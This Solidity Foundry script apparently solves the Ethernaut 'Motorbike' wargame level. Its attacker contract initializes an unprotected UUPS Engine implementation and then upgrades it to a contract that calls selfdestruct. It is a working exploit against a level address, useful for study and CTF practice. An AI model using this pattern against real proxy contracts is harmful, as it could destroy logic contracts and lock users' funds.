// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {Motorbike, Engine} from "../src/Level25.sol";

contract Attacker {
    Motorbike motorbike;
    Engine engine;
    Destructive destructive;

    constructor(address motorbikeAddr, address engineAddr) public {
        motorbike = Motorbike(payable(motorbikeAddr));
        engine = Engine(engineAddr);
        destructive = new Destructive();
    }

    function attack() external {
        engine.initialize();
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engine.upgradeToAndCall(address(destructive), encodedData);
    }
}

contract Destructive {
    function killed() external {
        selfdestruct(address(0));
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x082198127b7d7adf8D3f035599F15D78C1C0f665;
        address engineAddr = address(
            uint160(
                uint256(
                    vm.load(
                        address(levelAddr),
                        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                    )
                )
            )
        );

        Attacker attacker = new Attacker(levelAddr, engineAddr);

        attacker.attack();

        vm.stopBroadcast();
    }
}
